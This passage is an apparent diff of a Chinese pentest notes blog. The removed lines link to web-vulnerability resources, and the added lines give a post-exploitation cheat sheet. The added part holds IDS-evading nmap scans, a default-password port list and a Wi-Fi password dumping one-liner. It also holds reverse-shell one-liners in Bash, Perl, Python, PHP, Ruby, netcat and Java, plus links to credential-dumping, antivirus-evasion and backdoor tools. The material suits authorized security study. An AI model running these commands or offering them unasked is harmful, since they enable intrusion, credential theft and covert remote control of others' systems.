-<li>Sqlite<ul>
-<li><a href="https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/sqlite/sqlite_hacking.md" target="_blank" rel="noopener">SQLITE HACKING</a></li>
-</ul>
-</li>
-<li>SQL Server<ul>
-<li><a href="https://blog.csdn.net/weixin_33871366/article/details/87981818" target="_blank" rel="noopener">MSSQL注射知识库 v 1.0</a></li>
-</ul>
-</li>
-<li>Oracle<ul>
-<li><a href="http://www.anquan.us/static/drops/tips-57.html" target="_blank" rel="noopener">Hacking Oracle with Sql Injection</a></li>
-<li>CVE-2014-6577（XXE <a href="http://www.anquan.us/static/drops/papers-6035.html" target="_blank" rel="noopener">Oracle盲注结合XXE漏洞远程获取数据</a>）</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h5 id="NoSQL注入"><a href="#NoSQL注入" class="headerlink" title="NoSQL注入"></a>NoSQL注入</h5><ul>
-<li><a href="https://blog.csdn.net/qq_27446553/article/details/79379481" target="_blank" rel="noopener">冷门知识 — NoSQL注入知多少</a></li>
-<li><a href="https://www.cnblogs.com/wangyayun/p/6598166.html" target="_blank" rel="noopener">NoSQL注入的分析和缓解</a></li>
-<li><a href="https://github.com/codingo/NoSQLMap" target="_blank" rel="noopener">NoSQLMap</a></li>
-<li>Mongodb<ul>
-<li><a href="https://www.secpulse.com/archives/3278.html" target="_blank" rel="noopener">Mongodb注入攻击</a></li>
-<li><a href="https://www.secpulse.com/archives/27004.html" target="_blank" rel="noopener">Ruby-China Mongodb注入可导致盗用管理员(他人)身份发帖</a></li>
-</ul>
-</li>
-</ul>
-<h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><ul>
-<li><a href="https://blog.csdn.net/fly_hps/article/details/80781196" target="_blank" rel="noopener">文件上传漏洞（绕过姿势）</a></li>
-<li><a href="https://www.secpulse.com/archives/53533.html" target="_blank" rel="noopener">我的WafBypass之道（upload篇）</a></li>
-</ul>
-<h5 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h5><ul>
-<li><a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">Server-Side Template Injection</a></li>
-<li><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">tplmap</a></li>
-</ul>
-<h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><ul>
-<li><a href="https://www.t00ls.net/articles-41070.html" target="_blank" rel="noopener">SSRF漏洞(原理&amp;绕过姿势)</a></li>
-<li><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">利用Gopher协议拓展攻击面</a></li>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/SSRF/build_your_ssrf_exp_autowork--20160711.pdf" target="_blank" rel="noopener">build_your_ssrf_exp_autowork–20160711</a></li>
-</ul>
-<h5 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h5><ul>
-<li><a href="https://xz.aliyun.com/t/2571" target="_blank" rel="noopener">XML外部实体注入小结</a></li>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/XXE/5-XML%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB_%E4%BB%8E%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%AD%A5%E6%AD%A5%E6%83%8A%E5%BF%83-%E5%BC%A0%E5%A4%A9%E7%90%AA.pdf" target="_blank" rel="noopener">XML实体攻击：从内网探测到命令执行步步惊心-张天琪</a></li>
-<li><a href="https://www.secpulse.com/archives/6256.html" target="_blank" rel="noopener">玩转JSON节点的Content-Type XXE攻击</a></li>
-<li><a href="https://github.com/enjoiz/XXEinjector" target="_blank" rel="noopener">XXEinjector</a></li>
-</ul>
-<h5 id="前端相关"><a href="#前端相关" class="headerlink" title="前端相关"></a>前端相关</h5><ul>
-<li><p>Misc</p>
-<ul>
-<li><a href="https://wooyun.js.org/drops/URL%20Hacking%20-%20前端猥琐流.html" target="_blank" rel="noopener">URL Hacking - 前端猥琐流</a></li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><a href="http://www.vuln.cn/6213" target="_blank" rel="noopener">GET来的漏洞</a></li>
-<li><a href="http://www.vuln.cn/6894" target="_blank" rel="noopener">我的通行你的证</a><ul>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%89%8D%E7%AB%AF%E7%9B%B8%E5%85%B3/Misc/%E4%BD%A0%E4%B8%8A%E4%BA%86%E6%88%91%E7%9A%84%E8%B4%A6%E5%8F%B7.pptx" target="_blank" rel="noopener">你上了我的账号</a></li>
-</ul>
-</li>
-<li><a href="https://www.secpulse.com/archives/35877.html" target="_blank" rel="noopener">JS敏感信息泄露：不容忽视的WEB漏洞</a><ul>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%89%8D%E7%AB%AF%E7%9B%B8%E5%85%B3/Misc/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%BE%88%E9%87%8D%E8%A6%81.pdf" target="_blank" rel="noopener">信息收集很重要</a></li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><p><a href="https://xz.aliyun.com/t/224" target="_blank" rel="noopener">跨域方法总结</a></p>
-</li>
-<li><p>JSONP</p>
-<ul>
-<li><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="noopener">JSONP安全攻防技术</a></li>
-</ul>
-</li>
-<li><p>CORS</p>
-<ul>
-<li><a href="https://www.freebuf.com/articles/web/18493.html" target="_blank" rel="noopener">跨域资源共享(CORS)安全性浅析</a></li>
-<li><a href="https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" target="_blank" rel="noopener">Exploiting CORS Misconfigurations for Bitcoins and Bounties</a></li>
-<li><a href="http://www.hackdig.com/06/hack-52260.htm" target="_blank" rel="noopener">高级CORS利用技术</a></li>
-</ul>
-</li>
-<li><p>PostMessage</p>
-<ul>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%89%8D%E7%AB%AF%E7%9B%B8%E5%85%B3/Misc/%E5%AF%B9%E6%96%B9%E4%B8%8D%E6%83%B3%E8%AF%B4%E8%AF%9D%E5%B9%B6%E6%89%94%E4%BA%86%E4%B8%AAmessage.pptx" target="_blank" rel="noopener">对方不想说话并扔了个message</a></li>
-</ul>
-</li>
-</ul>
-<pre><code>- [PostMessage跨域漏洞分析](https://www.secpulse.com/archives/56637.html)</code></pre><ul>
-<li><p>WebSocket</p>
-<ul>
-<li><a href="https://www.anquanke.com/post/id/85999" target="_blank" rel="noopener">【技术分享】WebSocket漏洞与防护详解</a></li>
-<li><a href="https://xz.aliyun.com/t/2572" target="_blank" rel="noopener">黑客是如何攻击 WebSockets 和 Socket.io的</a></li>
-</ul>
-</li>
-<li><p>Flash</p>
-<ul>
-<li><a href="https://blog.csdn.net/ycpanda/article/details/17769405" target="_blank" rel="noopener">Flash安全的一些总结</a></li>
-<li><a href="https://www.cnblogs.com/-yan/p/4529269.html" target="_blank" rel="noopener">flash跨域策略文件crossdomain.xml配置详解</a></li>
-</ul>
-</li>
-</ul>
-<ul>
-<li>框架<ul>
-<li><a href="https://xz.aliyun.com/t/192" target="_blank" rel="noopener">现代前端框架的信息泄露问题</a></li>
-<li>AngularJS<ul>
-<li><a href="https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs" target="_blank" rel="noopener">XSS without HTML: Client-Side Template Injection with AngularJS</a></li>
-<li><a href="https://www.freebuf.com/vuls/125932.html" target="_blank" rel="noopener">AngularJS沙箱绕过：反射型XSS导致麦当劳用户密码泄露</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>XSS<ul>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%89%8D%E7%AB%AF%E7%9B%B8%E5%85%B3/XSS/find_xss.png" target="_blank" rel="noopener">find_xss.png</a><ul>
-<li><a href="https://gitlab.com/sfish/pt/blob/master/Web%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%89%8D%E7%AB%AF%E7%9B%B8%E5%85%B3/XSS/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS.pdf" target="_blank" rel="noopener">那些年我们一起学XSS</a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&mid=2247484070&idx=1&sn=673e20a08d9ae6c3de60ca48110b920a&scene=21#wechat_redirect" target="_blank" rel="noopener">先知XSS挑战赛 - L3m0n Writeup</a></li>
-<li><a href="https://blog.csdn.net/xysoul/article/details/45476775" target="_blank" rel="noopener">XSS Filter Evasion Cheat Sheet 中文版</a></li>
-</ul>
-</li>
-<li>编码技巧<ul>
-<li><a href="http://www.anquan.us/static/drops/tips-689.html" target="_blank" rel="noopener">XSS与字符编码的那些事儿 ——科普文</a></li>
-<li><a href="http://www.vuln.cn/6602" target="_blank" rel="noopener">XSS和字符集的那些事儿</a></li>
-</ul>
-</li>
-<li>CSP绕过<ul>
-<li><a href="https://xz.aliyun.com/t/318" target="_blank" rel="noopener">初探CSPBypass一些细节总结</a></li>
-</ul>
-</li>
-<li>利用<ul>
-<li><a href="http://bobao.360.cn/learning/detail/159.html" target="_blank" rel="noopener">小松鼠的黑魔法-XSS利用</a></li>
-<li><a href="https://www.freebuf.com/column/133411.html" target="_blank" rel="noopener">XSS自动化入侵内网</a></li>
-<li><a href="http://www.anquan.us/static/drops/tips-2924.html" target="_blank" rel="noopener">常见Flash XSS攻击方式</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li>CSRF<ul>
-<li>结合Flash<ul>
-<li><a href="http://blog.knownsec.com/tag/flashupload-csrf/" target="_blank" rel="noopener">Flash+Upload Csrf攻击技术</a></li>
-<li><a href="http://www.vuln.cn/6205" target="_blank" rel="noopener">Flash CSRF</a></li>
-<li><a href="https://www.jianshu.com/p/d063a222f5a5" target="_blank" rel="noopener">使用Flash进行JSON CSRF攻击</a></li>
-</ul>
-</li>
-<li>结合CORS<ul>
-<li><a href="http://www.hackdig.com/01/hack-42979.htm" target="_blank" rel="noopener">一种新型蠕虫：花瓣CORSBOT蠕虫</a></li>
-</ul>
-</li>
-<li>结合XSS<ul>
-<li><a href="http://www.vuln.cn/6530" target="_blank" rel="noopener">Uber三个鸡肋漏洞的妙用</a></li>
-</ul>
-</li>
-<li>结合URL跳转<ul>
-<li><a href="https://ngailong.wordpress.com/2017/08/07/uber-login-csrf-open-redirect-account-takeover/" target="_blank" rel="noopener">[Uber 8k Bug] Login CSRF + Open Redirect = Account Take Over</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>XSSI<ul>
-<li><a href="https://www.freebuf.com/articles/web/87374.html" target="_blank" rel="noopener">揭开XSSI攻击的神秘面纱</a></li>
-<li><a href="https://www.freebuf.com/articles/web/179851.html" target="_blank" rel="noopener">挖洞经验|看我如何发现雅虎XSSi漏洞实现用户信息窃取</a></li>
-</ul>
-</li>
-</ul>
+        <h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><h2 id="基础设施分析"><a href="#基础设施分析" class="headerlink" title="基础设施分析"></a>基础设施分析</h2><h3 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h3><ul>
+<li>nmap<br>最高速全端口：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-65535 -T4 -A --min-rate 2500 --max-retries 0</span><br></pre></td></tr></table></figure>
 
+</li>
+</ul>
+<p>比较隐蔽：</p>
+<ul>
+<li>-PS : nmap向目标主机发送一个设置了SYN标志位的空的TCP报文，不管主机返回SYN/ACK包还是RST包，它都认为该主机存活。不过虽然官方文档上说该参数只关心主机是否存活，不过在当前最新版本的nmap来看，这个命令也对主机的各个端口进行了探测。</li>
+<li>-sS:进行TCP SYN扫描，这个选项返回的结果与-PS返回的结果很像，它们两个参数的区别就是，-sS会发送一个ICMP包给目标主机          </li>
+</ul>
+<p>躲避IDS和IPS</p>
+<ul>
+<li>-mtu 8 发送大小为8字节的探针包躲避入侵检测</li>
+<li>-D ip1，ip2，ip3(发送假ip地址的探测包欺骗入侵检测)</li>
+<li>–source-port 54 指定特定的源端口发送侦测数据包</li>
+<li>–randomize-hosts 10.10.10.1-254 让扫描顺序随机化而不是顺序扫描</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">25 SMTP </span><br><span class="line">53 DNS </span><br><span class="line">69 TFTP </span><br><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">110 POP3 </span><br><span class="line">135 RPC </span><br><span class="line">139 NETBIOS </span><br><span class="line">143 IMAP </span><br><span class="line">161 SNMP </span><br><span class="line">389 LDAP </span><br><span class="line">443 SSL心脏滴血以及一些web漏洞测试 </span><br><span class="line">445 SMB </span><br><span class="line">512,513,514 Rexec </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">1025,111 NFS </span><br><span class="line">1080 socks </span><br><span class="line">1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案 </span><br><span class="line">1433 MSSQL (暴力破解) </span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line">2082/2083 cpanel主机管理系统登陆 （国外用较多） </span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外用较多） </span><br><span class="line">2601,2604 zebra路由，默认密码zebra </span><br><span class="line">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </span><br><span class="line">3306 MySQL （暴力破解） </span><br><span class="line">3312/3311 kangle主机管理系统登陆 </span><br><span class="line">3389 远程桌面 </span><br><span class="line">3690 svn </span><br><span class="line">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </span><br><span class="line">4848 GlassFish web中间件 弱口令:admin/adminadmin </span><br><span class="line">5432 PostgreSQL </span><br><span class="line">5900 vnc </span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">7778 Kloxo主机控制面板登录 </span><br><span class="line">8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </span><br><span class="line">8080 tomcat/WDCd/ 主机管理系统，默认弱口令 </span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line">8081 Symantec AV/Filter for MSE </span><br><span class="line">8083 Vestacp主机管理系统 （国外用较多） </span><br><span class="line">8649 ganglia </span><br><span class="line">8888 amh/LuManager 主机管理系统默认端口 </span><br><span class="line">9000 fcgi fcig php执行 </span><br><span class="line">9043 websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">10000 Virtualmin/Webmin 服务器虚拟主机管理系统 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">28017 mongodb统计页面 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50060 hadoop </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>
+
+<h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><ul>
+<li><p>Ping探测 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt; for /L %I in (1,1,254) do ping -w 30 -n 1 192.168.1.%I | find “回复” &gt;&gt; 输出.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看路由表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看连接信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看共享资源列表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看管理员登录ip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>域传送漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">server=ns.xx.com</span><br><span class="line">ls xx.com</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><ul>
+<li><p>Ping探测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ip in $(seq 1 254); do ping -c1 -w2 192.168.1.$ip&gt;/dev/null; [ $? -eq 0 ] &amp;&amp; echo &quot;192.168.1.$ip UP&quot; || : ; done</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看路由表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route -n</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看连接信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>域传送漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @ns.xxx.com axfr xxx.com</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>msf scanner</p>
+</li>
+<li><p><a href="https://note.youdao.com/" target="_blank" rel="noopener">arp-scan </a></p>
+</li>
+<li><p><a href="https://note.youdao.com/" target="_blank" rel="noopener">nessus</a></p>
+</li>
+</ul>
+<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><ul>
+<li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a><br>打补丁不成功的话尝试这个脚本<br><a href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed" target="_blank" rel="noopener">Dump-Clear-Text-Password-after-KB2871997-installed</a></li>
+<li>GetPass_32.exe</li>
+<li>GetPass_64.exe</li>
+<li><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">laZagne</a>可导出浏览器，wifi，mail等的账号密码</li>
+<li>键盘记录</li>
+<li>查看所有保存的wifi密码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan show profiles&apos;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<h3 id="令牌伪造"><a href="#令牌伪造" class="headerlink" title="令牌伪造"></a>令牌伪造</h3><ul>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1" target="_blank" rel="noopener">powershell</a></li>
+<li><a href="https://github.com/foxglovesec/RottenPotato" target="_blank" rel="noopener">RottenPotato</a></li>
+</ul>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">反弹shell</a></h3><p>Bash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>PERL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
+
+<p>Python</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
+
+<p>PHP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+
+<p>Ruby</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br></pre></td></tr></table></figure>
+
+<p>NC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br></pre></td></tr></table></figure>
+
+<p>If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>Java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">### 提权</span><br><span class="line">- [windows](https://github.com/SecWiki/windows-kernel-exploits)</span><br><span class="line">- [linux](https://github.com/SecWiki/linux-kernel-exploits)</span><br><span class="line">- [linux提权辅助](https://github.com/rebootuser/LinEnum)</span><br><span class="line">### 免杀</span><br><span class="line">- [shellter](https://www.shellterproject.com/download/)</span><br><span class="line"></span><br><span class="line">- [K8_SC_ENCODE](https://www.cnblogs.com/k8gege/p/10261491.html)</span><br><span class="line">- [the-backdoor-factory](https://github.com/secretsquirrel/the-backdoor-factory) 给软件捆绑后门</span><br><span class="line"></span><br><span class="line">- [便捷化payload生成](https://github.com/Screetsec/TheFatRat)</span><br><span class="line"></span><br><span class="line">- [Veil-Evasion ](https://github.com/Veil-Framework/Veil-Evasion)</span><br><span class="line">Veil-Evasion是与Metasploit生成相兼容的Payload的一款辅助框架，并可以绕过大多数的杀软</span><br><span class="line"></span><br><span class="line">- [Veil-Evasion不在更新，新版本veil](https://github.com/Veil-Framework/Veil)</span><br><span class="line">- [GreatSCT是以metasploit payload为核心，白名单辅助payload执行框架](https://github.com/GreatSCT/GreatSCT)</span><br><span class="line"></span><br><span class="line">### 维持权限</span><br><span class="line">参考micro8</span><br><span class="line">- 本地后门：如系统后门，这里指的是装机后自带的某 功能或者自带软件后门 </span><br><span class="line">- 本地拓展后门：如iis 6的isapi，iis7的 模块后门 </span><br><span class="line">- 第三方后门：如apache，serv-u，第三方软件后门 </span><br><span class="line">- 第三方扩展后门：如php扩展后门，apache扩展后 门，第三方扩展后门 </span><br><span class="line">- 人为化后门：一般指被动后门，由人为引起触发导致 激活，或者传播，如经典的shift后门</span><br><span class="line"></span><br><span class="line">### 掠夺敏感信息</span><br><span class="line">#### windows：</span><br><span class="line">- [everything搜索文件](https://www.voidtools.com/zh-cn/downloads/)（搜全盘文件，TXT，Excel，word）</span><br><span class="line">- 有道笔记</span><br><span class="line">- 印象笔记</span><br><span class="line">- 浏览器保存的账号密码和历史记录</span><br><span class="line">- 备份文件</span><br><span class="line">- 数据库等敏感配置文件</span><br><span class="line">- 回收站</span><br><span class="line">#### 网段中</span><br><span class="line">- 利用内网dns来获取子域名</span><br><span class="line">- 共享文件</span><br><span class="line">- nas（大部分在5000，5001端口，可通过端口扫描发现）</span><br><span class="line">- gitlab</span><br><span class="line">- svn</span><br><span class="line">- 打印机</span><br><span class="line">- 考勤系统</span><br><span class="line">- 监控系统</span><br><span class="line">- </span><br><span class="line"></span><br><span class="line">### 横向移动</span><br><span class="line">端口爆破：</span><br><span class="line">[hydra](https://github.com/vanhauser-thc/thc-hydra)</span><br><span class="line"></span><br><span 